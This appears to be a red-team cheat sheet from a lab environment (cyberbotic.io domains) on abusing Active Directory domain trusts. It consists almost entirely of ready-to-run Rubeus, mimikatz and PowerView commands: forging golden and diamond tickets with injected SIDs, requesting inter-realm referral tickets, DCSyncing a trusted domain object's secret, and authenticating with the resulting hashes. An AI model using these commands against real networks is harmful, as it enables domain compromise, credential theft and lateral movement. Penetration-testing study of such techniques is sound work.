# Parent/Child

```bash
# Get info about domain trusts
powershell Get-DomainTrust

# Get SID in target group in parent domain
powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

# Get DC hostname
powershell Get-DomainController -Domain cyberbotic.io | select Name

# Create Golden ticket # aes from kerberos
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:Administrator /password:FakePass /ticket:doIFmDCCBZSgAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADA
steal_token <pid>

# Or create Diamond ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```

---

# One way Inbound

```bash
# Get info about domain trusts
powershell Get-DomainTrust

# Get DC on inbound trust forest and group members
powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
powershell Get-DomainForeignGroupMember -Domain dev-studio.com

# Convert from SID to member group (users in this group are admins on the trusted inbound admin domain)
powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120

# Get users from that group
powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName

# Obtain a TGT for the target user (using their ntlm or their aes256)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap

# User the previous ticket to request a referral ticket from the current domain to the target domain
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

# Use this inter-realm ticket to request a TGS in the target domain
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap
ls \\dc.dev-studio.com\c$
```

---

# One way Outbound

```bash
# Get info about domain trusts
# executed in: a machine with network access to `cyberbotic.io` domain (likely in the DEV domain, querying AD)
powershell Get-DomainTrust -Domain cyberbotic.io

# Check TDOs
# executed in: the current machine, querying `cyberbotic.io` AD via LDAP
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

# DcSync with the TDO's GUID
# executed in: any machine with access to `cyberbotic.io` AD, querying for GUID of TDO for `msp.org`
powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
# executed in: any machine with sufficient privileges (typically a system with administrative access to `cyberbotic.io` domain)
mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

# Use the NTLM hash to request a TGT
# executed in: the current machine, targeting the `msp.org` domain with the hash of the CYBER$ machine account
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CYBER /username:nglover /password:FakePass /ticket:doIFGD

# Check for access
# executed in: the current machine, querying the `msp.org` AD domain
powershell Get-Domain -Domain msp.org
```
